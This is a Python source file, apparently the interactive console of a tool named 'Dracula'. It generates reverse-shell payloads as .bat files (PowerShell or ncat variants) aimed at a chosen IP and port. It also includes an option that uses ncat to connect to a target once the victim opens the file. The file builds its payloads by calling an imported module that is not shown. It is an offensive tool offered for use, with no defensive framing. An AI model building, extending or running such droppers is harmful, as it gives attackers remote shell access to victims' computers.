import os
import subprocess
import argparse
import Main.dracula_main as main

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    print('\n')
    banner = [
        "     _____                       _       ",
        "    |  __ \\                     | |      ",
        "    | |  | |_.__ __._  ___._   _| | __._ ",
        "    | |  | |  __/ _  |/ __| | | | |/ _  |",
        "    | |__| | | | (_| | (__| |_| | | (_| |",
        "    |_____/|_|  \\__._|\\___|\\__._|_|\\__._|"
    ]
    colors = [57, 63, 69, 75, 81, 87]
    for i, line in enumerate(banner):
        txt_color = colors[i % len(colors)]
        print(''.join(f'\033[38;5;{txt_color}m{char}' for char in line))
    print("[-] Developed by ch37\n\033[0m[-] Use -h for help")

clear_screen()
print_banner()

payload_type = None

while True:
    dracula_cm = input("\033[38;5;57mDracula >> \033[0m ").split()
    if not dracula_cm:
        continue
    
    if dracula_cm[0].lower() == "set" and len(dracula_cm) > 1:
        payload_option = dracula_cm[1].lower()
        if payload_option in ["powershell_payload", "ncat_payload"]:
            payload_type = "powershell" if payload_option == "powershell_payload" else "ncat"
            print(f"\033[38;5;69mPayload set to {payload_type.capitalize()}\033[0m")
        else:
            print("\033[38;5;31mInvalid payload type. Use 'powershell_payload' or 'ncat_payload'.\033[0m")
        continue
    
    parser = argparse.ArgumentParser(description="Generate a reverse shell payload in form of a batch file.")
    parser.add_argument("-p", "--port", help="Port number for the reverse shell")
    parser.add_argument("-s", "--shell", help="Shell type (cmd, bash, powershell, etc.)")
    parser.add_argument("-o", "--output", help="Output file name")
    parser.add_argument("-l", "--connect", action="store_true", help="Connects with the target if the target opens the file")
    parser.add_argument("-i", "--ip", help="Specify the IP address of the target")
    
    try:
        args = parser.parse_args(dracula_cm)
        
        if args.connect and args.port and args.ip:
            print(f"Starting connection to {args.ip} on port {args.port}...")
            try:
                subprocess.run(["ncat", args.ip, str(args.port)], check=True)
            except subprocess.CalledProcessError as e:
                print(f"\033[38;5;31mError starting connection: {e}")
            except FileNotFoundError:
                print("\033[38;5;31mError: 'ncat' not found. Please install ncat.")
            except Exception as e:
                print(f"\033[38;5;31mUnexpected error: {e}")
        
        elif payload_type == "powershell" and args.port and args.output and args.ip:
            print("\033[38;5;69mGenerating PowerShell payload...\033[0m")
            powershell_script = main.generate_payload_ps(args.ip, args.port, args.output)
            try:
                with open(args.output + ".bat", "w") as f:
                    f.write(powershell_script)
                    print(f"\n\033[38;5;69mSUCCESS!!! \033[0mCREATED {args.output}.bat ")
            except Exception as e:
                print(f"\033[38;5;31mAn error occurred: {e}")
        
        elif payload_type == "ncat" and args.port and args.shell and args.output:
            print("\033[38;5;69mGenerating Ncat payload...\033[0m")
            main.generate_payload_ncat(args.port, args.shell, args.output)
        
        elif args.port or args.shell or args.output:
            print("\033[38;5;31mPlease specify all required arguments.\033[0m")
        
        else:
            print("\033[38;5;31mInvalid command. Use 'set <payload_type>' first.\033[0m")
    
    except SystemExit:
        pass
    except Exception as e:
        print(f"\033[38;5;31mAn error occurred: {e}")
